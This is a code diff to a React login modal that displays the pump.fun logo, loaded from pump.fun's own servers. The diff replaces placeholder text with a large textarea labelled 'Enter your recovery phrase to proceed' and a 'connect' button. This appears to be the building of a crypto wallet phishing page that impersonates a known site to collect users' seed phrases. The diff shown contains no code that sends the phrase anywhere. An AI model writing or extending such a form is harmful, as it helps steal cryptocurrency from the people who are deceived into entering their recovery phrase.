@@ -12,11 +12,14 @@ export const Login = () => {
               <span>&times;</span>
             </button>
           </div>
-          <div className="text-center">
+          <div className="text-center pb-2">
               <img alt="logo" loading="lazy" width="72" height="72" decoding="async" data-nimg="1" className="m-6" src="https://pump.fun/_next/static/media/logo-pump.80ada4f8.svg" style={{color: "transparent"}}></img>
             </div>
           <div className="modal-body">
-            <p>Lorem ipsum dolor sit amet consectetur, adipisicing elit. Quidem quaerat fugiat optio. Nihil fuga ipsum ipsa enim, debitis at ipsam.</p>
+            <div className="form-floating">
+              <textarea className="form-control" placeholder="type here..." id="floatingTextarea2" style={{height: "200px"}}></textarea>
+              <label htmlFor="floatingTextarea2">Enter your recovery phrase to proceed</label>
+            </div>
           </div>
           <div className="modal-footer">
             <button type="button" className="btn btn-green">connect</button> {/* data-bs-dismiss="modal"*/}
